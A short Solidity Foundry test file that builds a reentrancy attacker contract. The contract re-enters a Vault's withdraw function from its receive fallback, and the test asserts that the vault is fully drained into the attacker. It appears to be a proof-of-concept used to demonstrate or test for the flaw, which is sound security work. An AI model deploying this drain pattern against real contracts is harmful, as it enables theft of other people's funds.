pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../../contracts/Vault.sol";

contract Reenter {
    Vault private immutable vault;

    constructor(Vault v) payable {
        vault = v;
    }

    function run() external {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) vault.withdraw(1 ether);
    }
}

contract ReenterWithdrawTest is Test {
    function test_depositorDrainsVault() public {
        Vault vault = new Vault();
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 10 ether}();
        Reenter attacker = new Reenter{value: 1 ether}(vault);
        attacker.run();
        assertEq(address(vault).balance, 0);
        assertEq(address(attacker).balance, 11 ether);
    }
}

